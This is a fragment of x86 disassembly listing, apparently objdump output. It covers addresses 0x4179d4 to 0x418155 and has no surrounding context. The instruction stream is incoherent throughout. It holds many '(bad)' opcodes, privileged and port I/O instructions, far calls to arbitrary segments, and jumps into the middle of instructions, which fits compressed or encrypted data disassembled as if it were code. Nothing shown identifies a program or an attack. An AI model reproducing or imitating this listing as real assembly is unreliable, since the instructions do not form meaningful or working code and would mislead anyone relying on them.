  4179d4:	fisub  DWORD PTR [eax+0x68507446]
  4179da:	jge    0x4179fa
  4179dc:	xchg   edx,eax
  4179dd:	sahf   
  4179de:	jo     0xd74c7681
  4179e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4179e5:	sbb    DWORD PTR [esi+esi*1+0x2c],esp
  4179e9:	pusha  
  4179ea:	loope  0x417a60
  4179ec:	or     ebp,eax
  4179ee:	repnz sti 
  4179f0:	stos   BYTE PTR es:[edi],al
  4179f1:	jecxz  0x4179da
  4179f3:	jo     0x417a08
  4179f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4179f6:	mov    ebp,0x80bf7d99
  4179fb:	cmc    
  4179fc:	adc    DWORD PTR [ebx+0x1efbdad0],ebx
  417a02:	ss imul edx,eax,0xffffff85
  417a06:	xchg   cl,bh
  417a08:	jg     0x41799a
  417a0a:	ret    
  417a0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a0c:	push   esi
  417a0d:	xor    BYTE PTR [edi+0x52bb2332],0xcd
  417a14:	(bad)  
  417a15:	js     0x41799b
  417a17:	inc    esi
  417a18:	rcl    BYTE PTR [esi+0x11524dcd],1
  417a1e:	cwde   
  417a1f:	and    ch,BYTE PTR ds:0xd5e423d2
  417a25:	aad    0x79
  417a27:	popf   
  417a28:	dec    edi
  417a29:	shl    BYTE PTR [eax+eiz*4-0x4a4d57dc],cl
  417a30:	inc    edi
  417a31:	hlt    
  417a32:	dec    edi
  417a33:	bound  ebp,QWORD PTR [ecx+0xa62e215]
  417a39:	xor    eax,DWORD PTR [ebp+0x58]
  417a3c:	fs push esi
  417a3e:	mov    BYTE PTR [ebx+0x6c],cl
  417a41:	retf   0xa9f9
  417a44:	dec    esp
  417a45:	loopne 0x4179f4
  417a47:	outs   dx,BYTE PTR ds:[esi]
  417a48:	push   cs
  417a49:	sub    eax,0x65cb5bf3
  417a4e:	repnz (bad) 
  417a51:	jp     0x417a5c
  417a53:	or     edx,ebp
  417a55:	inc    ebp
  417a56:	jns    0x4179f3
  417a58:	xchg   ecx,eax
  417a59:	push   ebp
  417a5a:	lds    ax,DWORD PTR [eax-0x40]
  417a5e:	cli    
  417a5f:	mov    ds:0x65ff5f59,al
  417a64:	into   
  417a65:	push   esp
  417a66:	adc    al,0x4e
  417a68:	mov    DWORD PTR [edi-0x5e],ebx
  417a6b:	lock sub bl,BYTE PTR [ebx+eiz*2]
  417a6f:	ja     0x417a44
  417a71:	xchg   esp,eax
  417a72:	enter  0xec16,0x21
  417a76:	add    BYTE PTR [edx-0x6],al
  417a79:	fs dec ebp
  417a7b:	mov    eax,ds:0x9dd342be
  417a80:	mov    bh,0x6b
  417a82:	aaa    
  417a83:	xchg   ebx,eax
  417a84:	mov    ch,0xce
  417a86:	pop    ebx
  417a87:	push   edx
  417a88:	mov    ebx,ebx
  417a8a:	ja     0x417adb
  417a8c:	push   edi
  417a8d:	cs arpl cx,dx
  417a90:	clc    
  417a91:	popf   
  417a92:	ret    0x2504
  417a95:	push   ebx
  417a96:	jge    0x417a23
  417a98:	cld    
  417a99:	stc    
  417a9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a9b:	out    0x70,eax
  417a9d:	pop    esi
  417a9e:	xor    bl,BYTE PTR [ebp+0x47da3b7d]
  417aa4:	inc    edx
  417aa5:	mov    al,ds:0x9367db47
  417aaa:	cdq    
  417aab:	jnp    0x417a30
  417aad:	test   eax,0x4b7a68aa
  417ab2:	inc    edi
  417ab3:	pusha  
  417ab4:	push   edi
  417ab5:	pop    esp
  417ab6:	jmp    0x417a9d
  417ab8:	loop   0x417a60
  417aba:	fisttp QWORD PTR [edx-0x1fdcf7be]
  417ac0:	inc    edx
  417ac1:	sub    BYTE PTR [ebp+0x2a],al
  417ac4:	das    
  417ac5:	xor    al,0x2c
  417ac7:	add    eax,0x5e08a1bd
  417acc:	mov    al,0xc2
  417ace:	aam    0x99
  417ad0:	sbb    al,0x8
  417ad2:	add    ch,BYTE PTR [ecx]
  417ad4:	out    dx,al
  417ad5:	or     BYTE PTR [ebp-0x2dbb5aed],al
  417adb:	iret   
  417adc:	cs aaa 
  417ade:	or     ah,BYTE PTR [edi]
  417ae0:	adc    DWORD PTR [edi-0x58],edi
  417ae3:	inc    eax
  417ae4:	sbb    ch,dh
  417ae6:	jbe    0x417b4c
  417ae8:	das    
  417ae9:	cwde   
  417aea:	cld    
  417aeb:	pop    eax
  417aec:	sbb    ah,BYTE PTR [edi]
  417aee:	sbb    BYTE PTR [ecx-0x51183381],ah
  417af4:	xchg   esi,eax
  417af5:	in     al,0x84
  417af7:	add    DWORD PTR [ebp+0x7d2cc0a3],ebx
  417afd:	jb     0x417ab8
  417aff:	sub    esp,ebp
  417b01:	xor    ebx,DWORD PTR [ecx*8-0xeb354bb]
  417b08:	rol    DWORD PTR [esi],0xe1
  417b0b:	mov    edx,0xb024453e
  417b10:	aad    0xcf
  417b12:	fst    st(2)
  417b14:	jmp    0x417b03
  417b16:	mov    ds:0x357125cf,al
  417b1b:	repnz ins BYTE PTR es:[edi],dx
  417b1d:	aaa    
  417b1e:	mov    es,WORD PTR [ebx-0x10]
  417b21:	out    0x82,al
  417b23:	nop
  417b24:	fwait
  417b25:	adc    BYTE PTR [ebx+eiz*4-0x1f],0x0
  417b2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b2b:	dec    eax
  417b2c:	inc    esi
  417b2d:	(bad)  
  417b2e:	std    
  417b2f:	pop    esp
  417b30:	es jo  0x417b97
  417b33:	pop    edx
  417b34:	xor    DWORD PTR [ebx-0x37],ebp
  417b37:	mov    ds:0xfb201b5f,al
  417b3c:	mov    BYTE PTR [edx+ebx*1-0x3c],dl
  417b40:	inc    edx
  417b41:	icebp  
  417b42:	inc    esp
  417b43:	cmp    DWORD PTR [ecx-0x3c],ebp
  417b46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b47:	(bad)  
  417b48:	call   0xcbff6f62
  417b4d:	jl     0x417b92
  417b4f:	adc    ebx,DWORD PTR [ecx+eax*8+0x1f]
  417b53:	mov    al,ds:0xbf1218cc
  417b58:	std    
  417b59:	pop    esp
  417b5a:	lods   eax,DWORD PTR gs:[esi]
  417b5c:	mov    ah,BYTE PTR [esi+0x6d]
  417b5f:	or     ecx,edi
  417b61:	pop    edx
  417b62:	cs mov ebp,0x23309ece
  417b68:	jecxz  0x417b10
  417b6a:	dec    BYTE PTR [eax]
  417b6c:	mov    edi,0xf6627c41
  417b71:	or     al,0x89
  417b73:	ds mov bh,0xb3
  417b76:	addr16 xchg ebx,eax
  417b78:	and    DWORD PTR [esi],ebx
  417b7a:	bound  edi,QWORD PTR [esi]
  417b7c:	iret   
  417b7d:	mov    eax,ebp
  417b7f:	adc    BYTE PTR [eax+0xc],al
  417b82:	xchg   edx,eax
  417b83:	xchg   esp,eax
  417b84:	xchg   edi,eax
  417b85:	mov    esp,0xfe0b2b70
  417b8a:	xlat   BYTE PTR ds:[ebx]
  417b8b:	dec    esi
  417b8c:	aam    0x8f
  417b8e:	pop    edx
  417b8f:	mov    edi,0xde400f49
  417b94:	sahf   
  417b95:	rcr    al,cl
  417b97:	inc    edx
  417b98:	jae    0x417bd9
  417b9a:	mov    edx,0x8163239c
  417b9f:	ret    0x2588
  417ba2:	inc    esi
  417ba3:	jae    0x417b7c
  417ba5:	jae    0x417ba4
  417ba7:	jg     0x417bab
  417ba9:	push   edi
  417baa:	xchg   esp,eax
  417bab:	fldcw  WORD PTR [esi-0x3df6435c]
  417bb1:	jno    0x417c1b
  417bb3:	push   ebx
  417bb4:	cmp    dh,BYTE PTR [ecx+0x195f4963]
  417bba:	stos   BYTE PTR es:[edi],al
  417bbb:	mov    cl,BYTE PTR [edi+eax*4+0x5]
  417bbf:	ins    DWORD PTR es:[edi],dx
  417bc0:	add    eax,ebp
  417bc2:	adc    eax,0xf4978de9
  417bc7:	cmp    edx,DWORD PTR [ecx-0x6faba71e]
  417bcd:	dec    ebp
  417bce:	leave  
  417bcf:	jmp    0x417b99
  417bd1:	cmp    esp,DWORD PTR [ebx]
  417bd3:	jno    0x417bdd
  417bd5:	call   0xf1fc:0xe2d8eb09
  417bdc:	pop    esp
  417bdd:	mov    DWORD PTR [edx+0x1d],0x876b11ef
  417be4:	nop
  417be5:	mov    eax,0x913cfe5b
  417bea:	ja     0x417bcf
  417bec:	cmp    BYTE PTR [esi+0x7c],cl
  417bef:	sub    al,0xc3
  417bf1:	xor    al,0x80
  417bf3:	ins    DWORD PTR es:[edi],dx
  417bf4:	jp     0x417c20
  417bf6:	pop    ds
  417bf7:	inc    esi
  417bf8:	popf   
  417bf9:	jnp    0x417c2a
  417bfb:	fdiv   DWORD PTR [eax-0x51]
  417bfe:	or     edx,ecx
  417c00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c01:	mov    eax,0x46d81c06
  417c06:	xor    DWORD PTR [ecx-0x5bc81870],esp
  417c0c:	cmp    BYTE PTR [ebx+0x6a],cl
  417c0f:	mov    bl,0xd1
  417c11:	sbb    ecx,DWORD PTR [ecx+0x3d]
  417c14:	neg    BYTE PTR [esi-0x2a]
  417c17:	gs inc esi
  417c19:	shl    DWORD PTR [edi+0x69410bf7],cl
  417c1f:	add    eax,0x476352d5
  417c24:	sbb    esp,DWORD PTR [esi+0x73506a53]
  417c2a:	adc    eax,0x8d801374
  417c2f:	fwait
  417c30:	(bad)  
  417c31:	sub    BYTE PTR [esi+0x2b39e45f],bl
  417c37:	jmp    0x1279713b
  417c3c:	adc    al,0xf5
  417c3e:	mov    ah,0xe4
  417c40:	(bad)  
  417c41:	int3   
  417c42:	adc    eax,0xfbea746c
  417c47:	adc    DWORD PTR [edi-0x4f],esi
  417c4a:	call   FWORD PTR [edi+0xe946ae3]
  417c50:	retf   
  417c51:	mov    ch,0xaa
  417c53:	icebp  
  417c54:	in     eax,dx
  417c55:	scas   eax,DWORD PTR es:[edi]
  417c56:	push   ebp
  417c57:	dec    esi
  417c58:	xor    DWORD PTR [ecx+0x17ba192b],0x7
  417c5f:	or     DWORD PTR [eax],esp
  417c61:	pop    es
  417c62:	xchg   esi,eax
  417c63:	call   0x4e0dc13f
  417c68:	push   edi
  417c69:	mov    dl,0xfd
  417c6b:	add    esi,DWORD PTR [edx-0x6b]
  417c6e:	push   0xfa1ab4a7
  417c73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c74:	sub    BYTE PTR [ebx],ah
  417c76:	mov    al,0xb8
  417c78:	jae    0x417c42
  417c7a:	fadd   st,st(0)
  417c7c:	out    dx,al
  417c7d:	arpl   WORD PTR [eax+0x578b8ebd],dx
  417c83:	clc    
  417c84:	shl    DWORD PTR gs:[ecx+0x10],cl
  417c88:	in     eax,dx
  417c89:	xchg   edx,eax
  417c8a:	aas    
  417c8b:	imul   edx,DWORD PTR [ebx-0x2e],0x69
  417c8f:	std    
  417c90:	mov    ebp,0x9ba04515
  417c95:	push   esi
  417c96:	lock adc ecx,DWORD PTR [edi]
  417c99:	fistp  QWORD PTR [eax]
  417c9b:	and    ebp,DWORD PTR [edi-0x24]
  417c9e:	dec    esp
  417c9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ca0:	stos   DWORD PTR es:[edi],eax
  417ca1:	dec    ebp
  417ca2:	lahf   
  417ca3:	in     eax,dx
  417ca4:	mov    esp,0x762242f1
  417ca9:	cmp    dl,BYTE PTR [edx-0x78cad401]
  417caf:	xchg   ebp,eax
  417cb0:	les    esp,FWORD PTR [edx-0x64]
  417cb3:	inc    ebx
  417cb4:	cs pop ebp
  417cb6:	push   edi
  417cb7:	in     eax,dx
  417cb8:	add    al,0xd5
  417cbb:	sar    dl,cl
  417cbd:	jbe    0x417cf3
  417cbf:	ret    
  417cc0:	mov    cl,0xfd
  417cc2:	cmp    dl,bh
  417cc4:	xchg   edi,eax
  417cc5:	sbb    BYTE PTR [ebx+0x3fa4848e],cl
  417ccb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ccc:	retf   
  417ccd:	xor    BYTE PTR [esi],al
  417ccf:	add    ebp,DWORD PTR [eax+0x6f16ff6f]
  417cd5:	xchg   ecx,eax
  417cd6:	(bad)  
  417cd7:	jno    0x417ce8
  417cd9:	sub    BYTE PTR [esi+0x66],ah
  417cdc:	xchg   ecx,eax
  417cde:	sbb    BYTE PTR [eax-0x159fd6a8],bl
  417ce4:	fldcw  WORD PTR [esi+0x23]
  417ce7:	cs sbb eax,esi
  417cea:	inc    edi
  417ceb:	lea    bp,[ebx+0x78]
  417cef:	cwde   
  417cf0:	pusha  
  417cf1:	cs mov ebp,0x7a616331
  417cf7:	jl     0x417c93
  417cf9:	icebp  
  417cfa:	push   esp
  417cfb:	mov    ebx,0xc03e8eff
  417d00:	or     bh,BYTE PTR [ecx+0x2d]
  417d03:	fwait
  417d04:	sar    DWORD PTR [edx+0x45],0x7
  417d08:	sub    cl,dh
  417d0a:	repnz sub eax,0xe618a752
  417d10:	scas   eax,DWORD PTR es:[edi]
  417d11:	mov    ecx,0x68d20c6f
  417d16:	(bad)  
  417d17:	mov    ecx,0xc96b34a2
  417d1c:	xor    ecx,DWORD PTR [ebx-0x6f]
  417d1f:	sti    
  417d20:	add    dl,BYTE PTR [eax-0x60dec601]
  417d26:	(bad)  
  417d27:	js     0x417d62
  417d29:	and    bh,al
  417d2b:	push   0x4a0e5b10
  417d30:	push   ds
  417d31:	mov    ebp,0xb2f0311c
  417d36:	in     eax,dx
  417d37:	pop    ebp
  417d38:	inc    ebx
  417d39:	ss jnp 0x417d26
  417d3c:	push   edi
  417d3d:	push   ebx
  417d3e:	mov    WORD PTR [esi],gs
  417d40:	push   edi
  417d41:	pop    es
  417d42:	xlat   BYTE PTR ds:[ebx]
  417d43:	jo     0x417d6d
  417d45:	mov    esp,0x585412e
  417d4a:	popa   
  417d4b:	sub    esp,DWORD PTR [edi-0x46859184]
  417d51:	mov    dl,BYTE PTR fs:[ebx+0x1b15f66]
  417d58:	xor    DWORD PTR [ecx],0x7e
  417d5b:	inc    esp
  417d5c:	or     DWORD PTR [edx],ebx
  417d5e:	(bad)  
  417d5f:	int3   
  417d60:	cmp    al,0x4f
  417d62:	pop    esp
  417d63:	mov    WORD PTR [esi+esi*8+0x20caab7],gs
  417d6a:	and    BYTE PTR [ecx],al
  417d6c:	sub    BYTE PTR [edx],ah
  417d6e:	cmp    eax,0xfb64dc6b
  417d73:	shl    DWORD PTR [esi-0x1c23f5d9],1
  417d79:	shl    BYTE PTR [eax],1
  417d7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d7c:	dec    edi
  417d7d:	mov    gs,WORD PTR [edi+0x33]
  417d80:	scas   al,BYTE PTR es:[edi]
  417d81:	retf   0x9850
  417d84:	mov    esp,0x31ebde95
  417d89:	adc    ebp,DWORD PTR [ebx+0x17]
  417d8c:	add    al,0xc9
  417d8e:	or     ch,BYTE PTR [ecx*2+0xd3028b7]
  417d95:	jb     0x417d9b
  417d97:	adc    BYTE PTR [edi],0x3f
  417d9a:	sbb    dh,BYTE PTR [edi-0x7a]
  417d9d:	ror    BYTE PTR [edx-0x2f],0xda
  417da1:	pop    esp
  417da2:	retf   
  417da3:	(bad)  
  417da4:	(bad)  [ecx-0x4331db13]
  417daa:	mov    edi,edi
  417dac:	addr16 retf 
  417dae:	fcomp  DWORD PTR [eax+0x19c09c2d]
  417db4:	adc    al,0x4f
  417db6:	es jg  0x417d5d
  417db9:	mov    eax,ds:0x80f2b3ca
  417dbe:	sub    al,0x52
  417dc0:	shr    ah,cl
  417dc2:	inc    edx
  417dc3:	loop   0x417dcf
  417dc5:	mov    ecx,0x279d170
  417dca:	lss    edi,FWORD PTR [edi+0xe]
  417dce:	xchg   ebp,eax
  417dcf:	adc    eax,0xc0b14257
  417dd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417dd5:	enter  0xd7c6,0x1c
  417dd9:	int    0xcc
  417ddb:	ja     0x417e40
  417ddd:	xchg   ecx,eax
  417dde:	(bad)  
  417ddf:	and    esi,DWORD PTR [esi+0xf]
  417de2:	ins    BYTE PTR es:[edi],dx
  417de3:	jae    0x417dbf
  417de5:	arpl   WORD PTR [esi-0x6],bx
  417de8:	adc    DWORD PTR [ecx+0x17],esp
  417deb:	or     edi,DWORD PTR gs:[ecx+0x50]
  417def:	jmp    0xee10590
  417df4:	adc    BYTE PTR [ecx+0x3a],0xa9
  417df8:	add    al,BYTE PTR [ebp+0x5e]
  417dfb:	pop    ecx
  417dfc:	pushf  
  417dfd:	ds jne 0x417dcc
  417e00:	fisttp DWORD PTR [eax+0x77]
  417e03:	stos   BYTE PTR es:[edi],al
  417e04:	or     al,dh
  417e06:	pop    esp
  417e07:	push   esi
  417e08:	xor    BYTE PTR [ebx-0x2c],dh
  417e0b:	mov    al,0x76
  417e0d:	mov    edx,0x65640e61
  417e12:	mov    DWORD PTR [edx+0x1b],ecx
  417e15:	dec    edi
  417e16:	push   edx
  417e17:	adc    DWORD PTR [edi+0x65ade9ac],0xff04eac6
  417e21:	pop    eax
  417e22:	bound  edx,QWORD PTR [esi-0x8]
  417e25:	and    al,0x1e
  417e27:	inc    ebp
  417e28:	pop    ecx
  417e29:	lods   al,BYTE PTR ds:[esi]
  417e2a:	sti    
  417e2b:	pop    ecx
  417e2c:	pushf  
  417e2d:	push   0xffffffac
  417e2f:	jg     0x417e46
  417e31:	push   ebx
  417e32:	gs or  eax,0x68975343
  417e38:	rol    esi,0x57
  417e3b:	jecxz  0x417eb3
  417e3d:	and    ebx,DWORD PTR [esi]
  417e3f:	push   ebp
  417e40:	sub    eax,0xcf998f5
  417e45:	xor    ch,BYTE PTR [ebx+ebp*2]
  417e48:	dec    edi
  417e49:	push   0x55
  417e4b:	jmp    0x417e8e
  417e4d:	(bad)  
  417e4e:	pop    edx
  417e4f:	xchg   esp,eax
  417e50:	mov    edx,0x116c3f40
  417e55:	outs   dx,BYTE PTR ds:[esi]
  417e56:	(bad)  
  417e57:	ss pop ecx
  417e59:	mov    ds:0xbb9dc064,eax
  417e5e:	in     eax,dx
  417e5f:	push   ss
  417e60:	cmp    dh,BYTE PTR [edx-0x40]
  417e63:	add    al,0x8b
  417e65:	ins    BYTE PTR es:[edi],dx
  417e66:	xchg   edx,eax
  417e67:	ja     0x417e25
  417e69:	push   edx
  417e6a:	(bad)  
  417e6b:	add    bh,cl
  417e6d:	bound  edx,QWORD PTR [edx]
  417e6f:	fwait
  417e70:	sti    
  417e71:	jns    0x417e20
  417e73:	push   cs
  417e74:	jge    0x417ec3
  417e76:	pusha  
  417e77:	das    
  417e78:	fwait
  417e79:	lds    esi,FWORD PTR [ebp-0x3b]
  417e7c:	mov    ah,0x92
  417e7e:	and    al,0xac
  417e80:	pop    ss
  417e81:	adc    edx,DWORD PTR [ebx-0x7f]
  417e84:	rcr    edx,1
  417e86:	lahf   
  417e87:	ret    0xa960
  417e8a:	stc    
  417e8b:	ins    BYTE PTR es:[edi],dx
  417e8c:	push   cs
  417e8d:	repz repz xor ebp,DWORD PTR [eax]
  417e91:	sub    dh,ch
  417e93:	loop   0x417eea
  417e95:	cli    
  417e96:	ret    
  417e97:	jg     0x417e26
  417e99:	xchg   ah,dh
  417e9b:	fmul   QWORD PTR [edx+ecx*1-0x18]
  417e9f:	and    eax,0x832e7013
  417ea4:	jne    0x417e35
  417ea6:	xchg   ecx,eax
  417ea7:	inc    BYTE PTR [ebp-0x35d21073]
  417ead:	in     eax,dx
  417eae:	sub    al,0xe0
  417eb0:	int    0x64
  417eb2:	sub    al,0xc7
  417eb4:	sub    eax,0xdcd374eb
  417eb9:	aaa    
  417eba:	xlat   BYTE PTR ds:[ebx]
  417ebb:	cld    
  417ebc:	mov    ah,0xe7
  417ebe:	mov    ecx,0x18465226
  417ec3:	sbb    eax,0xe5051a9e
  417ec8:	sbb    ecx,ebx
  417eca:	les    ebx,FWORD PTR [ebx+0xc]
  417ecd:	mov    ebp,ebx
  417ecf:	stos   BYTE PTR es:[edi],al
  417ed0:	shl    BYTE PTR [ebx-0x360aa0e],cl
  417ed6:	and    BYTE PTR [ebp+0x64],0x60
  417eda:	mov    DWORD PTR [ecx],ebx
  417edc:	mov    ecx,0xd32666cd
  417ee1:	(bad)  
  417ee2:	scas   eax,DWORD PTR es:[edi]
  417ee3:	scas   al,BYTE PTR es:[edi]
  417ee4:	aas    
  417ee5:	in     eax,0x67
  417ee7:	mov    eax,ds:0x421d36c5
  417eec:	push   edi
  417eed:	in     al,dx
  417eee:	(bad)  
  417eef:	les    ebp,FWORD PTR [ecx+0x49660c8d]
  417ef5:	daa    
  417ef6:	cmp    eax,0xe640df19
  417efb:	repz (bad) [ecx+0x757415d6]
  417f02:	or     al,cl
  417f04:	inc    edi
  417f05:	sar    bl,cl
  417f07:	stc    
  417f08:	xchg   ecx,eax
  417f09:	leave  
  417f0a:	xor    BYTE PTR [edi+0x70207435],bl
  417f10:	sub    BYTE PTR [esi-0x6e2b9050],dl
  417f16:	pop    edx
  417f17:	fwait
  417f18:	jo     0x417ea6
  417f1a:	push   0x46
  417f1c:	gs out dx,al
  417f1e:	dec    esp
  417f1f:	fbstp  TBYTE PTR [eax]
  417f21:	sbb    BYTE PTR [ebx-0x42],ch
  417f24:	nop
  417f25:	adc    bl,dh
  417f27:	or     DWORD PTR [esi+edx*1-0x71],esp
  417f2b:	mov    ebp,DWORD PTR [ebp-0x7a]
  417f2e:	push   esi
  417f2f:	enter  0x72e,0x3a
  417f33:	pop    edi
  417f34:	push   edi
  417f35:	loope  0x417fa1
  417f37:	aam    0x5c
  417f39:	aaa    
  417f3a:	sahf   
  417f3b:	lods   eax,DWORD PTR ds:[esi]
  417f3c:	push   ecx
  417f3d:	push   ds
  417f3e:	jmp    0xb082:0x802c6445
  417f45:	repz add dl,ch
  417f48:	xor    cl,BYTE PTR [edx-0x19]
  417f4b:	pushf  
  417f4c:	mov    ss,WORD PTR [edi-0x62]
  417f4f:	jmp    0x64078a6f
  417f54:	ins    BYTE PTR es:[edi],dx
  417f55:	not    DWORD PTR [eax]
  417f57:	pop    edi
  417f58:	daa    
  417f59:	dec    ebp
  417f5a:	pop    ds
  417f5b:	data16 add BYTE PTR [edx+0x22814301],bl
  417f62:	xchg   BYTE PTR [ebx-0x52631610],dl
  417f68:	add    DWORD PTR [edx+eax*8+0x24789c55],esi
  417f6f:	add    al,0xb2
  417f71:	out    dx,eax
  417f72:	dec    ebp
  417f73:	iret   
  417f74:	sbb    BYTE PTR [ecx-0x2a626f08],bl
  417f7a:	dec    edi
  417f7b:	pusha  
  417f7c:	and    edi,DWORD PTR [edi-0x1a]
  417f7f:	or     bl,BYTE PTR [ebx+0x64e14718]
  417f85:	inc    esp
  417f86:	mov    ah,0x2
  417f88:	mov    edx,0x92d43dfb
  417f8d:	dec    ebx
  417f8e:	jb     0x417f73
  417f90:	mov    es,WORD PTR [edx-0x69]
  417f93:	jae    0x417fd8
  417f95:	shr    DWORD PTR [eax+0x3b53d9d5],cl
  417f9b:	push   ebp
  417f9c:	out    0x43,al
  417f9e:	shl    DWORD PTR [ecx+0xd],1
  417fa1:	inc    edx
  417fa2:	addr16 out dx,al
  417fa4:	pop    edx
  417fa5:	inc    ebx
  417fa6:	mov    edi,0x5a124565
  417fab:	adc    dl,ah
  417fad:	fstp   QWORD PTR [eax-0x13]
  417fb0:	push   cs
  417fb1:	adc    al,0x2c
  417fb3:	clc    
  417fb4:	stos   BYTE PTR es:[edi],al
  417fb5:	xchg   esp,eax
  417fb6:	stc    
  417fb7:	inc    esp
  417fb8:	icebp  
  417fb9:	lods   al,BYTE PTR ds:[esi]
  417fba:	mov    ecx,0xd111d8c9
  417fbf:	push   es
  417fc0:	mov    esi,DWORD PTR [edx]
  417fc2:	jl     0x417f66
  417fc4:	bound  esp,QWORD PTR [esi]
  417fc6:	pop    eax
  417fc7:	dec    ecx
  417fc8:	lds    ebx,FWORD PTR [eax]
  417fca:	sti    
  417fcb:	sub    eax,0xf31feae8
  417fd0:	inc    esi
  417fd1:	icebp  
  417fd2:	pop    esp
  417fd3:	mov    dh,0xcb
  417fd5:	fcomp  DWORD PTR [eax-0xf6cbd8f]
  417fdb:	xchg   esp,eax
  417fdc:	in     eax,dx
  417fdd:	out    0x1f,eax
  417fdf:	push   ecx
  417fe0:	loop   0x417f8a
  417fe2:	enter  0x1be,0x62
  417fe6:	arpl   WORD PTR [edx],sp
  417fe8:	adc    BYTE PTR [edi],ch
  417fea:	dec    esp
  417feb:	jle    0x417fc1
  417fed:	adc    eax,0xe521adc0
  417ff2:	pop    esi
  417ff3:	xor    eax,ecx
  417ff5:	imul   ebx,DWORD PTR [ebp+0x1c],0xfffffff7
  417ff9:	iret   
  417ffa:	adc    dh,BYTE PTR [edx-0x23c614ed]
  418000:	mov    ebp,0x113e67ee
  418005:	call   0x9d80:0xb2d8226d
  41800c:	xor    dh,BYTE PTR [edi]
  41800e:	fdivr  QWORD PTR [esi+ebp*8]
  418011:	mov    edi,DWORD PTR [ebp+0xd057a74]
  418017:	push   edi
  418018:	out    0x37,eax
  41801a:	ins    BYTE PTR es:[edi],dx
  41801b:	and    BYTE PTR [ebx+eax*2],0xf0
  41801f:	call   0xfaeb:0xebef2654
  418026:	jp     0x418001
  418028:	or     BYTE PTR [edi+0x2df1e4ae],dl
  41802e:	add    ah,cl
  418030:	push   ebp
  418031:	xchg   DWORD PTR [eax],ecx
  418033:	xchg   ecx,eax
  418034:	adc    eax,0xc3880135
  418039:	test   al,0x11
  41803b:	jae    0x41807f
  41803d:	jmp    0x418013
  41803f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418040:	shl    dh,cl
  418042:	push   es
  418043:	jmp    0x418001
  418045:	or     al,0x4
  418047:	je     0x418034
  418049:	or     eax,DWORD PTR [edx]
  41804b:	xchg   esp,eax
  41804c:	cmp    ch,0x4e
  41804f:	out    0x9f,al
  418051:	adc    BYTE PTR [edx],0x95
  418054:	xor    ch,BYTE PTR [ecx-0x6]
  418057:	clc    
  418058:	test   dh,al
  41805a:	jl     0x418031
  41805c:	lahf   
  41805d:	jns    0x417fe3
  41805f:	rcl    DWORD PTR [eax+0x6802c171],0x1a
  418066:	mov    ebx,0x2324d145
  41806b:	pop    edx
  41806c:	fwait
  41806d:	push   esi
  41806e:	jns    0x4180e2
  418070:	jecxz  0x418077
  418072:	push   esp
  418073:	popa   
  418074:	sbb    eax,DWORD PTR [edx+0x5d]
  418077:	pop    ss
  418078:	or     DWORD PTR [esi],0xe65d6b0d
  41807e:	enter  0x7511,0x23
  418082:	in     eax,dx
  418083:	cmp    BYTE PTR [esi+0x6e40afd6],0x63
  41808a:	add    DWORD PTR [ebx-0x58cbc4c5],ecx
  418090:	test   al,0xc5
  418092:	mov    ch,0xd3
  418094:	lock out 0x12,al
  418097:	jp     0x418089
  418099:	pusha  
  41809a:	add    ah,BYTE PTR [ebp-0x2a]
  41809d:	mov    eax,ds:0x46fe224
  4180a2:	fst    QWORD PTR [ebp+0x5b]
  4180a5:	ss scas eax,DWORD PTR es:[edi]
  4180a7:	adc    al,0xd8
  4180a9:	jle    0x4180bb
  4180ab:	sub    bl,dl
  4180ad:	(bad)  
  4180ae:	push   ss
  4180af:	std    
  4180b0:	xchg   edx,eax
  4180b1:	loopne 0x418106
  4180b3:	mov    ecx,?
  4180b5:	add    BYTE PTR [edx+0x6d],0xd7
  4180b9:	push   0x4457148a
  4180be:	aad    0x2
  4180c0:	adc    ah,BYTE PTR [edx]
  4180c2:	shl    DWORD PTR [edi-0x5b],0xba
  4180c6:	mov    cl,BYTE PTR [esi+0x4e]
  4180c9:	inc    edi
  4180ca:	sahf   
  4180cb:	cmp    BYTE PTR [ebx-0x3b],ch
  4180ce:	dec    ecx
  4180cf:	xchg   BYTE PTR [edi+0x3a],dl
  4180d2:	adc    edx,DWORD PTR [eax+0x6d]
  4180d5:	adc    DWORD PTR [edi+0x4b9101a7],ebp
  4180db:	in     al,dx
  4180dc:	mov    ecx,0x6da986ee
  4180e1:	jb     0x418124
  4180e3:	cdq    
  4180e4:	jnp    0x4180f1
  4180e6:	div    DWORD PTR [edi-0x1bf4dd46]
  4180ec:	popfw  
  4180ee:	fsub   DWORD PTR [esi+0x7bc0d3c7]
  4180f4:	and    bh,BYTE PTR [eax]
  4180f6:	jmp    0x330:0x4895786a
  4180fd:	jno    0x418091
  4180ff:	mov    DWORD PTR [edx],edx
  418101:	add    BYTE PTR [edx+0x19f76693],al
  418107:	jb     0x418174
  418109:	(bad)  [esi-0x1fa7b7f1]
  41810f:	mov    dl,0x20
  418111:	or     ebp,DWORD PTR [ecx]
  418113:	int    0xc4
  418115:	or     eax,0x2e99f03
  41811a:	scas   eax,DWORD PTR es:[edi]
  41811b:	leave  
  41811c:	shl    BYTE PTR [ecx+edx*4],0x98
  418120:	mov    cs,WORD PTR ss:[ebx-0x5e]
  418124:	arpl   WORD PTR [ebp+ebx*2-0x11c5d694],cx
  41812b:	(bad)
  41812f:	sar    BYTE PTR ds:0xf4d6c6f7,cl
  418135:	ret    
  418136:	call   0x82fa:0xdbd41672
  41813d:	dec    eax
  41813e:	sbb    DWORD PTR [ecx],edi
  418140:	push   eax
  418141:	pushf  
  418142:	dec    ebp
  418143:	or     al,0xcd
  418145:	pop    ebp
  418146:	jecxz  0x4180df
  418148:	outs   dx,DWORD PTR ds:[esi]
  418149:	jmp    0xa8fb:0xfe2a1e28
  418150:	outs   dx,DWORD PTR ds:[esi]
  418151:	dec    edx
  418152:	push   cs
  418153:	je     0x4181a2
  418155:	mov    dh,0x7c
